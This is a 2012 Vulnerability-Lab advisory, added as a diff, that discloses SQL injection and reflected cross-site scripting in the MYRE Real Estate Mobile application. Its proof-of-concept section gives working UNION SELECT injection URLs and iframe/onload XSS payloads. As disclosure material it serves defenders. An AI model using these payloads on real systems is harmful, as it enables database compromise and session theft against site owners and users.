@@ -1,0 +1,170 @@
+Title:
+======
+MYRE Real Estate Mobile 2012|2 - Multiple Web Vulnerabilities
+
+
+Date:
+=====
+2012-05-01
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=516
+
+
+VL-ID:
+=====
+516
+
+
+Introduction:
+=============
+Best solution for a professional Real Estate management software. Try MYRE Real Estate Mobile Software, Real 
+Estate ready-to-use software best solution for a professional Real Estate management software. Try MYRE Real 
+Estate Software, Real Estate ready-to-use software. At MYRE Real Estate Software, we offer professional solutions 
+for your Real Estate business needs, including turn-key operations. That\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'s right, 
+turn-key! Start your real 
+estate business today with MYRE Real Estate Mobile Software and get into the real estate market the same day. 
+
+    Businesses for sale
+    Commercial properties for lease
+    Commercial properties for sale
+    Real estate properties for sale
+    Real estate properties for rent
+    Holiday rentals
+    Or any combination
+
+MYRE Real Estate Software provides a complete realty listing management solution. It is easily customized to reflect 
+your creativity whether you are starting from scratch or integrating it into an existing web site. MYRE Real Estate 
+Software can be used to promote residential as well as commercial rentals. This software is suitable for an 
+independent agent site, or the listings section of your brokerage and/or real estate agency web site.
+
+(Copy of the Vendor Homepage: http://www.myrephp.com &  http://myrephp.com/realestate/1_mobile/ )
+
+
+Abstract:
+=========
+The Vulnerability Laboratory Researcher Team discovered multiple Vulnerabilities in MYREs Real Estate Mobile 
+Application (2012 Q2).
+
+
+Report-Timeline:
+================
+2012-05-01:     Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+Critical
+
+
+Details:
+========
+1.1
+Multiple remote SQL Injection vulnerabilities are detected in MYREs Real Estate Mobile Application (2012 Q2).
+The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands 
+on the affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.
+The vulnerability is located on the link_idd & userid value of the mobile application.
+
+Vulnerable Module(s):
+                                [+] Listings - Link_IDD
+                                [+] Agent Profile - UserID
+
+Picture(s):
+                                ../1.png
+                                ../2.png
+
+
+1.2
+Multiple non persistent cross site scripting vulnerabilities are detected in MYREs Real Estate Mobile Application (2012 
+Q2).
+The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with high required 
+user inter action or local low privileged user account. Successful exploitation can result in account steal, phishing 
+& client-side content request manipulation.
+
+Vulnerable Module(s):
+                                [+] Search - bedrooms1
+                                [+] Search - price2
+
+Picture(s):
+                                ../3.png
+                                ../4.png
+
+
+Proof of Concept:
+=================
+1.1
+The SQL Injection vulnerabilities can be exploited by remote attacker without required user inter action.
+For demonstration or reproduce ...
+
+PoC:
+http://SITE/realestate/1_mobile/listings.php?link_idd=-13+UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,
+34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51--%20
+
+http://SITE/realestate/1_mobile/agentprofile.php?userid=16+union+select[SQL-INJECTION!]
+
+
+1.2
+The client side cross site scripting vulnerabilities can be exploited by remote attacker with medium 
+till high required user inter action. For demonstration or reproduce ...
+
+PoC:
+http://myrephp.com/realestate/1_mobile/search.php?cat_id1=1&city1=fu+&price2=%3E%22%3Ciframe+src
+%3Dwww.vulnerability-lab.com+onload%3Dalert%28%22VL%22%29+%3C&price1=%3E%22%3Ciframe+src%3Dwww.vulnerability-lab.com+
+onload%3Dalert%28%22VL%22%29&bedrooms1=1%3E%22%3Ciframe+src%3Dwww.google.com+onload%3Dalert%28%22VL%22%29+
+%3C&price1=%3E%22%3Ciframe+src%3Dwww.vulnerability-lab.com+onload%3Dalert%28%22VL%22%29&bathrooms1=0.5&order=link_id&
+sort=DESC&look=1&nolinks1=202- 
+
+
+Risk:
+=====
+1.1
+The security risk of the sql injection vulnerabilities are estimated as critical.
+
+1.2
+The security risk of the non persistent cross site scripting vulnerabilities are estimated as low(+).
+
+
+Credits:
+========
+Vulnerability Laboratory [Research Team] -  Ibrahim M. El-Sayed  (strom () vulnerability-lab com)
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all 
+warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. 
+Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss 
+of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such 
+damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing 
+limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from 
+Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, 
+including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+                                                Copyright © 2012 Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research () vulnerability-lab com
